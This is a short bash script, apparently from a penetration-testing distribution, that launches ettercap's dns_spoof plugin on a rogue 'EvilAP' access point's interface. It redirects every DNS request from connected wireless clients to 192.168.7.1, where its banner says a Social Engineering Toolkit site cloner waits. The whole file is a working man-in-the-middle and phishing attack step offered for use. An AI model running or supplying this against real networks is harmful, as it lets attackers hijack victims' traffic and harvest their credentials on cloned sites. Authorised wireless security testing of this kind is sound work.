#!/bin/bash
# Script to use ettercap to redirect all DNS traffic back to the device
# Use with SET (site cloner)
clear

. /opt/pwnix/pwnpad-scripts/px_interface_selector.sh

#drop if after apks fixed
if f_validate_one at0; then

f_banner(){
  printf "\nEvilAP Ettercap-NG 0.8.0 DNS Spoofing Tool\n\n"
  printf "[!] This only works when EvilAP is running!\n"
  printf "[!] Monitor mode (at0) must be active!\n\n"
  printf "[-] All DNS requests from wireless clients connected to EvilAP will be redirected to IP of EvilAP (192.168.7.1)\n\n"
  printf "[+] Use with Social Engineering Toolkit\n"
  printf "[-] (site cloner uses 192.168.7.1)\n\n"
}

f_run(){
  f_banner
  ettercap -i at0 -T -q -P dns_spoof
}

f_run
#drop if after apks fixed
fi
